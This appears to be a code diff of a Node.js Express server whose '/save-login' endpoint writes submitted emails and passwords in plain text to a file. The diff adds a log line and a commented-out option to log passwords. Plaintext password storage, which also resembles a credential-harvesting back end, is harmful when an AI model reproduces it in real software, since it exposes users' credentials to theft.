@@ -18,9 +18,17 @@ app.post('/save-login', (req, res) => {
   if (!email || !password)
     return res.status(400).send({ error: 'Missing email or password' });
 
+  // append to file
   fs.appendFileSync('logins.txt', `Email: ${email}, Password: ${password}\n`);
+
+  // log a short, useful line for Live Tail (avoid printing raw passwords to logs)
+  console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email}`);
+  // If you really need to log password (not recommended), do:
+  // console.log(`[LOGIN SAVED] ${new Date().toISOString()} email=${email} password=${password}`);
+
   res.send({ status: 'ok' });
 });
+
 
 // Save application form
 app.post('/save-application', (req, res) => {
